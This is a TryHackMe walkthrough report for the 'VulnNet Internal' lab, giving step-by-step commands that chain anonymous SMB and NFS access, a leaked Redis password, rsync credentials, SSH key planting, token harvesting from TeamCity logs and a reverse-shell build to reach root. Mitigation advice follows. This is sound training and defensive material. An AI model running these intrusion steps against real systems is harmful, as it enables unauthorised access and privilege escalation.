# 🟩VulnNet Internal – TryHackMe(THM) Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** September 07, 2025  
**Difficulty:** Easy/Medium  
**Category:** Internal Services / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open ports, services, and potential vulnerabilities.
- **Commands Used:**  
  ```bash
  nmap -sC -sV -A -Pn <target_ip>
  ```
- **Findings:**
  - Open ports: SSH (22), RPC (111), NetBIOS (139, 445), Rsync (873), NFS (2049), Zeus Admin (9090 filtered).
  - Services: OpenSSH 7.6p1 Ubuntu, Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP), Rsync (protocol 31), NFS 3-4.
  - SMB enumeration revealed shares: `print$`, `shares` (with subdirectories `temp` and `data`).
  - NFS export allowed mounting of `/opt/conf` directory, exposing configuration files including `redis.conf`.
  - Redis configuration revealed password: `B65Hx562F@ggAZ@F`.
  - Redis keys: `marketlist`, `authlist`, `internal flag`, `tmp`, `int`.

---

## 2. Exploitation Process

### Step 1 – SMB Share Enumeration
- Accessed anonymous SMB share `//<target_ip>/shares` using `smbclient`.
- Navigated to `temp` subdirectory and downloaded `services.txt`, containing the first flag.

### Step 2 – NFS Mount and Redis Enumeration
- Mounted NFS share:  
  ```bash
  sudo mkdir tmp/
  sudo mount -t nfs <target_ip>: tmp/
  ```
- Explored mounted filesystem (`tmp/opt/conf/redis/redis.conf`) to extract Redis password.
- Connected to Redis:  
  ```bash
  redis-cli -h <target_ip> -a "B65Hx562F@ggAZ@F"
  ```
- Listed keys (`KEYS *`) and retrieved the internal flag from key `"internal flag"`.

### Step 3 – Rsync Authentication and User Access
- From Redis `authlist` key (list type), extracted Base64-encoded credentials using `LRANGE authlist 1 100`.
- Decoded Base64:  
  ```bash
  echo "<base64_string>" | base64 -d
  ```
- Revealed Rsync credentials: `rsync-connect:Hcg3HP67@TW@Bc72v`.
- Listed Rsync modules:  
  ```bash
  rsync --list-only rsync://<target_ip>
  ```
- Accessed `files/sys-internal` module, revealing user home directory contents including `user.txt`.

### Step 4 – SSH Key Setup for User Access
- Generated SSH public key and synced it to target via Rsync:  
  ```bash
  cp ~/.ssh/id_rsa.pub authorized_keys
  rsync authorized_keys rsync://rsync-connect@<target_ip>/files/sys-internal/.ssh/
  ```
- Gained SSH access as `sys-internal`:  
  ```bash
  ssh sys-internal@<target_ip>
  ```
- Retrieved `user.txt` flag from home directory.

### Step 5 – Internal Service Discovery
- Enumerated listening ports:  
  ```bash
  ss -ltp
  ```
- Identified TeamCity running on localhost:8111.
- Set up SSH port forwarding:  
  ```bash
  ssh -L 8111:127.0.0.1:8111 sys-internal@<target_ip>
  ```
- Accessed TeamCity login page via forwarded port.

### Step 6 – TeamCity Super User Token Exploitation
- Searched logs for tokens:  
  ```bash
  grep -iR token /TeamCity/logs/ 2>/dev/null
  ```
- Extracted super user authentication token (e.g., `8446629153054945175`).
- Logged into TeamCity using empty username and token as password.
- Created a new build agent configuration and uploaded a reverse shell payload.
- Triggered build to execute reverse shell:  
  Listener: `nc -nlvp 4444`
- Gained root shell and retrieved `root.txt` flag from `/root/`.

---

## 3. Proof of Concept (PoC)

- **SMB Share Access:**  
  ```bash
  smbclient //10.10.233.179/shares
  cd temp
  get services.txt
  ```
  Downloaded file containing first flag.
- **NFS Mount and Redis Access:**  
  ```bash
  sudo mount -t nfs <target_ip>: tmp/
  redis-cli -h <target_ip> -a "B65Hx562F@ggAZ@F"
  KEYS *
  GET "internal flag"
  ```
  Retrieved internal flag.
- **Rsync Enumeration and SSH Setup:**  
  ```bash
  rsync --list-only rsync://rsync-connect@<target_ip>/files/sys-internal/
  rsync authorized_keys rsync://rsync-connect@<target_ip>/files/sys-internal/.ssh/
  ssh sys-internal@<target_ip>
  ```
  Gained user access and retrieved `user.txt`.
- **TeamCity Exploitation:**  
  ```bash
  ssh -L 8111:127.0.0.1:8111 sys-internal@<target_ip>
  # Access http://localhost:8111, login with token
  # Upload reverse shell and trigger build
  nc -nlvp 4444
  ```
  Gained root shell and retrieved `root.txt`.

---

## 4. Privilege Escalation

- Exploited Redis `authlist` for Rsync credentials to access user home via Rsync.
- Synced SSH public key to gain persistent user access as `sys-internal`.
- Used SSH port forwarding to access internal TeamCity (localhost:8111).
- Leveraged super user token from logs to authenticate in TeamCity, configure malicious build agent, and execute reverse shell for root access.

---

## 5. Mitigation Recommendations

- **SMB/NFS Hardening:**  
  - Disable anonymous access to SMB shares and restrict NFS exports to trusted IPs.
  - Use strong authentication and firewall rules to limit service exposure.
- **Redis Security:**  
  - Bind Redis to localhost only and enforce strong, unique passwords.
  - Disable dangerous commands (e.g., via `rename-command`) and avoid storing sensitive data in keys.
- **Rsync Protection:**  
  - Use SSH tunneling for Rsync and implement strong module passwords.
  - Restrict module access to authorized users and monitor for unauthorized listings.
- **SSH Key Management:**  
  - Enforce strict permissions on `.ssh/authorized_keys` and disable passwordless key uploads.
  - Use key-based authentication with passphrases and monitor SSH logs.
- **Internal Service Security:**  
  - Firewall internal ports (e.g., 8111) to prevent port forwarding abuse.
  - Secure TeamCity with strong admin credentials, token rotation, and log monitoring to prevent token exposure.
- **General Hardening:**  
  - Regularly update services (e.g., Samba, OpenSSH) and conduct privilege audits.
  - Implement logging, alerting, and least-privilege principles for all users and services.

---

## 6. Lessons Learned

- **Exposed Internal Services:** Anonymous SMB/NFS access can leak configuration files and credentials.
- **Misconfigured Databases:** Storing auth data in Redis without encryption enables easy extraction.
- **Rsync Vulnerabilities:** Weak module protections allow directory traversal and credential syncing.
- **Port Forwarding Risks:** Internal services like TeamCity are vulnerable via SSH tunneling if logs expose tokens.
- **Build Agent Exploitation:** CI/CD tools like TeamCity can execute arbitrary code if super user access is compromised.

---

## 7. Skills Practiced

- Network scanning (`nmap`)
- SMB/NFS enumeration and mounting
- Redis querying and data extraction
- Base64 decoding and Rsync exploitation
- SSH key management and port forwarding
- TeamCity super user token exploitation and reverse shell deployment
- Secure reporting and mitigation strategies
